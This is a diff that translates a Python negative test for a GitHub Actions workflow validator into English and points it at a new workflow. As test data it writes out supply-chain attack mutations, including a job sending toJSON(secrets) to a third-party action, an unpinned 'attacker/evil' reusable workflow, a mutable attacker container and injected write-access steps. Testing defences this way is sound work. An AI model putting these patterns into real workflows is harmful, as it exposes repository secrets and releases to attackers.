@@ -1,20 +1,20 @@
 #!/usr/bin/env python3
-"""PRUEBA EN NEGATIVO del validador de workflows.
+"""NEGATIVE TEST of the workflow validator.
 
-Un gate que nunca viste fallar no esta probado: validate-workflow.py podria
-estar diciendo "todo OK" porque no mira nada. Aqui se rompe deliberadamente el
-workflow real, una regla por mutacion, y se exige que el validador devuelva 1.
+A gate you have never seen fail is not tested: validate-workflow.py could be
+saying "all OK" because it looks at nothing. Here the real workflow is broken on
+purpose, one rule per mutation, and the validator is required to return 1.
 
-Cada mutacion corresponde a una forma concreta y documentada de comprometer la
-cadena de suministro (disparador que ejecuta texto de un desconocido, token en
-un job que corre codigo no confiable, accion reapuntada por su tag, secreto
-interpolado hacia una accion de tercero...). Si alguna deja de detectarse, el
-validador dejo de valer y esta suite se pone roja.
+Each mutation corresponds to a concrete, documented way of compromising the
+supply chain (a trigger that runs text written by a stranger, a token in a job
+that runs untrusted code, an action repointed through its tag, a secret
+interpolated towards a third-party action...). If any of them stops being
+detected, the validator is worthless and this suite goes red.
 
-CODIGOS DE SALIDA
-  0  todas las mutaciones fueron detectadas
-  1  alguna mutacion PASO el validador (hueco abierto)
-  2  no pude correr la prueba (falta PyYAML / falta el workflow)
+EXIT CODES
+  0  every mutation was detected
+  1  some mutation PASSED the validator (open hole)
+  2  I could not run the test (PyYAML missing / workflow missing)
 """
 import pathlib
 import subprocess
@@ -22,15 +22,15 @@ import sys
 
 ROOT = pathlib.Path(__file__).resolve().parents[3]
 VALIDATOR = ROOT / "scripts/gh/tests/validate-workflow.py"
-WORKFLOW = ROOT / ".github/workflows/promote-stable.yml"
+WORKFLOW = ROOT / ".github/workflows/release.yml"
 
 if not WORKFLOW.is_file() or not VALIDATOR.is_file():
-    print(f"  NO PUDE MEDIR: falta {WORKFLOW} o {VALIDATOR} (rc 2)", file=sys.stderr)
+    print(f"  COULD NOT MEASURE: {WORKFLOW} or {VALIDATOR} is missing (rc 2)", file=sys.stderr)
     sys.exit(2)
 try:
-    import yaml  # noqa: F401  (lo necesita el validador que vamos a invocar)
+    import yaml  # noqa: F401  (the validator we are about to invoke needs it)
 except Exception as e:  # noqa: BLE001
-    print(f"  NO PUDE MEDIR: falta PyYAML ({e}) (rc 2)", file=sys.stderr)
+    print(f"  COULD NOT MEASURE: PyYAML is missing ({e}) (rc 2)", file=sys.stderr)
     sys.exit(2)
 
 WF = WORKFLOW.read_text()
@@ -39,18 +39,21 @@ import tempfile
 TMP = pathlib.Path(tempfile.mkdtemp(prefix="wfmut-"))
 PASS, FAIL = 0, 0
 
-CHECKOUT_GATES = """    runs-on: ubuntu-latest
-    permissions:
-      contents: read
-    steps:
-      - name: Checkout del commit candidato"""
+# Anchors into the REAL workflow. If any of them stops matching, `rep()` aborts
+# with rc=2 ("could not measure") instead of silently testing nothing.
+CHECKOUT_GATES = """    permissions:
+      contents: read   # nothing else: this job does not publish
+    steps:"""
+VERIFY_HDR = """  verify:
+    name: Gates over the candidate tree"""
 PROMOTE_HDR = """  promote:
-    name: Mover stable y etiquetar"""
+    name: Publish stable"""
+CHECKOUT_SHA = "actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5.1.0"
 
 
 def rep(old, new):
     if old not in WF:
-        print(f"  NO PUDE MEDIR: el workflow cambio, no encuentro el patron {old[:50]!r}",
+        print(f"  COULD NOT MEASURE: the workflow changed, I cannot find the pattern {old[:50]!r}",
               file=sys.stderr)
         sys.exit(2)
     return WF.replace(old, new, 1)
@@ -66,113 +69,106 @@ def case(label, text, expect=1):
         print(f"  PASS  {label:<58s} rc={r.returncode}")
         PASS += 1
     else:
-        print(f"  FAIL  {label:<58s} rc={r.returncode} (esperado {expect})")
-        print("        el validador NO detecto esta mutacion: hueco abierto")
+        print(f"  FAIL  {label:<58s} rc={r.returncode} (expected {expect})")
+        print("        the validator did NOT detect this mutation: open hole")
         FAIL += 1
 
 
-print("== Mutaciones que el validador DEBE rechazar (rc 1)")
+print("== Mutations the validator MUST reject (rc 1)")
 
-case("disparador pull_request_target",
+case("pull_request_target trigger",
      rep("on:\n  schedule:", "on:\n  pull_request_target:\n  schedule:"))
-case("disparador issue_comment (texto de un desconocido)",
+case("issue_comment trigger (text written by a stranger)",
      rep("on:\n  schedule:", "on:\n  issue_comment:\n    types: [created]\n  schedule:"))
-case("disparador push",
+case("push trigger",
      rep("on:\n  schedule:", "on:\n  push:\n    branches: [main]\n  schedule:"))
-case("job 'gates' con contents:write",
+case("the job that runs the candidate with contents:write",
      rep(CHECKOUT_GATES, CHECKOUT_GATES.replace("contents: read", "contents: write")))
-case("permissions: write-all como STRING (no debe reventar, debe FALLAR)",
+case("permissions: write-all as a STRING (must not crash, must FAIL)",
      rep(CHECKOUT_GATES,
-         CHECKOUT_GATES.replace("    permissions:\n      contents: read",
+         CHECKOUT_GATES.replace("    permissions:\n      contents: read   # nothing else: this job does not publish",
                                 "    permissions: write-all")))
-case("sin permissions {} a nivel workflow",
+case("no workflow-level permissions {}",
      rep("permissions: {}\n", ""))
-case("accion fijada por tag mutable en vez de SHA",
-     rep("actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1",
-         "actions/checkout@v7"))
-case("interpolacion ${{ }} de datos dentro de un run",
-     rep("          set -euo pipefail\n          STABLE=$(jq",
+case("action pinned by a mutable tag instead of a SHA",
+     rep(CHECKOUT_SHA, "actions/checkout@v5"))
+case("${{ }} interpolation of data inside a run",
+     rep("          set -euo pipefail\n          git config user.name",
          '          set -euo pipefail\n'
          '          echo "${{ github.event.head_commit.message }}"\n'
-         "          STABLE=$(jq"))
-case("secreto propio del repo en env",
+         "          git config user.name"))
+case("the repo's own secret in env",
      rep("          GH_TOKEN: ${{ github.token }}",
          "          GH_TOKEN: ${{ secrets.PUBLISH_PAT }}"))
-case("contexto secrets encubierto: toJSON(secrets) hacia un tercero",
+case("covert secrets context: toJSON(secrets) towards a third party",
      rep(PROMOTE_HDR,
          "  exfil:\n"
          "    runs-on: ubuntu-latest\n"
          "    permissions:\n      contents: read\n"
          "    steps:\n"
-         "      - uses: tercero/accion@0000000000000000000000000000000000000000\n"
+         "      - uses: thirdparty/action@0000000000000000000000000000000000000000\n"
          "        with:\n          data: ${{ toJSON(secrets) }}\n\n" + PROMOTE_HDR))
-case("segundo job con contents:write",
+case("a second job with contents:write",
      rep(PROMOTE_HDR,
          "  extra:\n    runs-on: ubuntu-latest\n"
          "    permissions:\n      contents: write\n"
-         "    steps:\n      - run: echo hola\n\n" + PROMOTE_HDR))
-case("workflow reutilizable de tercero SIN fijar (jobs.<id>.uses)",
+         "    steps:\n      - run: echo hello\n\n" + PROMOTE_HDR))
+case("third-party reusable workflow UNPINNED (jobs.<id>.uses)",
      rep(PROMOTE_HDR,
-         "  reusable:\n    uses: atacante/malo/.github/workflows/x.yml@main\n"
+         "  reusable:\n    uses: attacker/evil/.github/workflows/x.yml@main\n"
          "    permissions:\n      contents: read\n\n" + PROMOTE_HDR))
-case("container de imagen mutable en el job que corre el candidato",
-     rep(CHECKOUT_GATES,
-         CHECKOUT_GATES.replace("    runs-on: ubuntu-latest",
-                                "    runs-on: ubuntu-latest\n    container: atacante/imagen:latest")))
-case("checkout del candidato CON credenciales persistidas (token al codigo no confiable)",
+case("mutable container image in the job that runs the candidate",
+     rep(VERIFY_HDR, VERIFY_HDR + "\n    container: attacker/image:latest"))
+case("candidate checkout WITH persisted credentials (token handed to untrusted code)",
      rep("""        with:
-          ref: ${{ needs.candidate.outputs.candidate_sha }}
+          ref: ${{ needs.resolve.outputs.source_sha }}
+          fetch-depth: 0
+          path: source
           persist-credentials: false""",
          """        with:
-          ref: ${{ needs.candidate.outputs.candidate_sha }}"""))
-case("el job con escritura ejecuta un script del arbol candidato",
-     rep("""    permissions:
-      contents: write
-    steps:
-      - name: Checkout""",
-         """    permissions:
-      contents: write
-    steps:
-      - name: Paso inyectado
-        run: bash scripts/gates/x.sh
-      - name: Checkout"""))
-case("el job con escritura hace checkout del commit candidato",
-     rep("""        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-        with:
-          ref: main
+          ref: ${{ needs.resolve.outputs.source_sha }}
           fetch-depth: 0
+          path: source"""))
+case("the job with write access runs a script from the candidate tree",
+     rep("""      - name: Build the stable tree
+        working-directory: source
+        run: |""",
+         """      - name: Injected step
+        run: bash source/scripts/gates/x.sh
 
-      - name: Empujar stable""",
-         """        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-        with:
-          ref: ${{ needs.candidate.outputs.candidate_sha }}
-          fetch-depth: 0
+      - name: Build the stable tree
+        working-directory: source
+        run: |"""))
+case("the job with write access runs the gates the candidate ships",
+     rep("""      - name: gate-plugin-version (stable channel)""",
+         """      - name: Injected gates step
+        run: bash source/scripts/gates/run-all.sh
 
-      - name: Empujar stable"""))
-case("defaults.run.shell cambiado (el bash -n dejaria de medir lo que se ejecuta)",
+      - name: gate-plugin-version (stable channel)"""))
+case("defaults.run.shell changed (bash -n would stop measuring what runs)",
      rep("permissions: {}\n", "permissions: {}\ndefaults:\n  run:\n    shell: python\n"))
 
 print()
-print("== El validador debe distinguir 'no pude medir' (rc 2) de 'esta mal' (rc 1)")
-r = subprocess.run([sys.executable, str(VALIDATOR), str(TMP / "no-existe.yml")],
+print("== The validator must tell 'could not measure' (rc 2) from 'it is wrong' (rc 1)")
+r = subprocess.run([sys.executable, str(VALIDATOR), str(TMP / "does-not-exist.yml")],
                    capture_output=True, text=True)
 case_ok = r.returncode == 2
-print(f"  {'PASS' if case_ok else 'FAIL'}  {'workflow inexistente -> rc 2':<58s} rc={r.returncode}")
+print(f"  {'PASS' if case_ok else 'FAIL'}  {'missing workflow -> rc 2':<58s} rc={r.returncode}")
 PASS, FAIL = (PASS + 1, FAIL) if case_ok else (PASS, FAIL + 1)
 
-p = TMP / "roto.yml"
+p = TMP / "broken.yml"
 p.write_text("on: [schedule\njobs: {")
 r = subprocess.run([sys.executable, str(VALIDATOR), str(p)], capture_output=True, text=True)
 case_ok = r.returncode == 2
-print(f"  {'PASS' if case_ok else 'FAIL'}  {'YAML corrupto -> rc 2':<58s} rc={r.returncode}")
+print(f"  {'PASS' if case_ok else 'FAIL'}  {'corrupt YAML -> rc 2':<58s} rc={r.returncode}")
 PASS, FAIL = (PASS + 1, FAIL) if case_ok else (PASS, FAIL + 1)
 
 print()
-print("== Y el workflow real, sin tocar, debe pasar (rc 0 no es un codigo muerto)")
+print("== And the real workflow, untouched, must pass (rc 0 is not dead code)")
 r = subprocess.run([sys.executable, str(VALIDATOR), str(WORKFLOW)],
                    capture_output=True, text=True)
 case_ok = r.returncode == 0
-print(f"  {'PASS' if case_ok else 'FAIL'}  {'workflow real intacto -> rc 0':<58s} rc={r.returncode}")
+print(f"  {'PASS' if case_ok else 'FAIL'}  {'real workflow intact -> rc 0':<58s} rc={r.returncode}")
 PASS, FAIL = (PASS + 1, FAIL) if case_ok else (PASS, FAIL + 1)
 
 print()
